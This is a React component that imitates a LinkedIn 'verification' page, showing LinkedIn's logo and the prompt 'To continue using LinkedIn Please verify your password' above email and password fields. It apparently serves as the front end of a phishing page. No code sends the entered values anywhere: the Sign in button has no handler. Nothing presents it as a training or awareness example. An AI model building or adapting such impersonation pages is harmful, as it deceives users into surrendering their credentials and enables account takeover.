import React, { useState } from "react";
import "./Verify.css";
import LiLogo from "../../../images/li-logo.png";

const VerifyLinkedin = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  return (
    <>
      <div className="logo-linkedin">
        <img src={LiLogo} alt="" />
      </div>
      <div className="verify-main">
        <h4>Linkedin Verification</h4>
        <p>To continue using LinkedIn Please verify your password</p>
        <input
        value={email}
          placeholder="Email"
          type="email"
          onChange={(e) => setEmail(e.target.value)}
        />
        <input
        value={password}
          placeholder="Password"
          type="password"
          onChange={(e) => setPassword(e.target.value)}
        />
        <div className="d-flex justify-content-center">
          <button>Sign in</button>
        </div>
      </div>
    </>
  );
};

export default VerifyLinkedin;
